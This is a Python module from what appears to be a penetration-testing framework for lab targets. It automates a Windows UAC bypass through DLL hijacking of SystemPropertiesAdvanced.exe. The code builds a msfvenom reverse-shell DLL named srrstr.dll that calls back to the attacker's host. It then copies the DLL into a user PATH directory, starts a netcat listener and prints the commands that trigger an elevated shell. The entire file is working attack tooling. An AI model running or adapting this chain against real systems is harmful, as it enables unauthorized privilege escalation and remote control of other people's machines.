import shutil
import subprocess
from pathlib import Path

from core.target import load_current_profile, get_active_cred
from core.attacker import resolve_lhost
from modules.upload.windows import stage_windows_files


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

DIM = '\033[2m'

#
# UACMe technique #54 — SystemPropertiesAdvanced.exe (32-bit, SysWOW64) is
# a Windows-signed auto-elevating binary that tries to load a non-existent
# srrstr.dll. Works from Windows 10 build 14393 onward per the HTB material;
# check UACMe's current list against your target build before relying on it.
#
TARGET_BINARY = r"C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe"
DLL_NAME = "srrstr.dll"


# ==========================================
# HELPERS
# ==========================================

def _header(target_dir):

    #
    # The drop directory is a full user-profile path — length is unpredictable
    # (varies with username), so it doesn't belong in a fixed-width box field.
    # Keep the box to a short, constant-width technique label instead.
    #
    print(f"\n{B}┌── MODULE: UAC BYPASS " + "─" * 26 + f"┐{W}")
    print(f"{B}│{W} TECHNIQUE: {C}{'SystemPropertiesAdvanced.exe (UACMe #54)':<36}{W}{B}│{W}")
    print(f"{B}└" + "─" * 48 + f"┘{W}")
    print(f"{B}Drop directory:{W} {C}{target_dir}{W}")


def _section(title):
    print(f"\n{B}[*] {title}{W}")


def _step(n, title, why=None):

    print(f"\n{B}[{n}]{W} {title}")

    if why:
        print(f"    {why}")


def _cmd(*lines):

    print()

    for line in lines:

        if line.startswith("#"):
            print(f"    {DIM}{line}{W}")
        elif "#" in line:
            code, comment = line.split("#", 1)
            print(f"    {Y}{code.rstrip()}{W}  {DIM}#{comment}{W}")
        else:
            print(f"    {Y}{line}{W}")


def _ask(prompt, default_yes=True, optional=False):

    #
    # Yellow [?] marks a genuinely skippable extra — not "defaults to no"
    # in general (that also covers safety gates, which should stay blue/
    # serious), just the ones where skipping has zero downside.
    #
    marker = Y if optional else B

    raw = input(f"\n{marker}[?]{W} {prompt}").strip().lower()

    if default_yes:
        return raw in ("", "y", "yes")

    return raw in ("y", "yes")


def _resolve_context():

    try:
        data, _ = load_current_profile()
    except Exception:
        data = {}

    ip = resolve_lhost(args=None, data=data)

    user = None

    try:
        user = get_active_cred(data).get("user")
    except Exception:
        pass

    return ip, user


def _start_listener(port):

    try:

        subprocess.Popen(
            ["x-terminal-emulator", "-e", f"bash -c 'nc -lvnp {port}; exec bash'"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(f"{G}[+] Started a Netcat listener on port {port} in a new terminal{W}")

    except Exception as e:

        print(f"{R}[-] Failed to start listener: {e}{W}")
        print(f"{Y}[!] Start one yourself: nc -lvnp {port}{W}")


def _generate_dll(lhost, lport):

    if not shutil.which("msfvenom"):

        print(f"\n{Y}[!] msfvenom not found on this box — generate it manually:{W}")
        _cmd(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -a x86 --platform windows -f dll -o {DLL_NAME}")

        return None

    print(f"\n{B}[*] Generating {DLL_NAME} with msfvenom...{W}")

    result = subprocess.run(
        [
            "msfvenom",
            "-p", "windows/shell_reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-a", "x86",
            "--platform", "windows",
            "-f", "dll",
            "-o", DLL_NAME,
        ],
        capture_output=True,
        text=True,
    )

    if result.returncode != 0 or not Path(DLL_NAME).is_file():

        print(f"{R}[-] msfvenom failed:{W}")
        print(result.stderr.strip())

        return None

    print(f"{G}[+] Generated {DLL_NAME}{W}")

    return Path(DLL_NAME)


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    ip, default_user = _resolve_context()

    default_dir = f"C:\\Users\\{default_user or '<USER>'}\\AppData\\Local\\Microsoft\\WindowsApps"

    target_dir = input(
        f"\n{B}[?]{W} User-writable PATH directory to drop the DLL in [{C}{default_dir}{W}]: "
    ).strip() or default_dir

    lport = input(f"\n{B}[?]{W} Listener port [{C}8443{W}]: ").strip() or "8443"

    _header(target_dir)

    _section("Setup")

    dll_path = _generate_dll(ip or "<ATTACKER-IP>", lport)

    if dll_path and _ask(f"Transfer {DLL_NAME} to the target? [Y/n]: "):
        stage_windows_files([dll_path], remote_dir=target_dir)

    if _ask(f"Start a Netcat listener on port {lport} now? [Y/n]: "):
        _start_listener(lport)

    #
    # Deliberately NOT numbered as part of the exploit chain, and defaults
    # to No — this is a sanity check, not a required step. If you're used
    # to just running every command in order, this stops that here instead
    # of relying on you reading the label.
    #
    if _ask("Not required — sanity-check the DLL unprivileged first? [y/N]: ", default_yes=False, optional=True):

        _section("Optional sanity check (skip this block entirely if you trust the delivery)")

        print(f"    {DIM}Still Medium integrity/low privileges on this connection — that's expected, it's not the real trigger.{W}")
        _cmd(f'rundll32 shell32.dll,Control_RunDLL {target_dir}\\{DLL_NAME}')

        print()
        print(f"    {B}[*]{W} Restart your listener now, then kill the process this just spawned before continuing:")
        _cmd(
            'tasklist /svc | findstr "rundll32"',
            "taskkill /PID <pid> /F   # repeat for each PID listed above",
        )

    _section("Execute on target")

    _step(
        1,
        "Restart your listener (nc exits after each catch), then trigger the auto-elevating binary",
        f"{TARGET_BINARY} is Windows-signed and auto-elevates — it loads {DLL_NAME} from PATH in that elevated context.",
    )
    _cmd(TARGET_BINARY)

    print()
    print(f"    {B}[*]{W} Confirm it worked: whoami /groups should now show High Mandatory Level.")
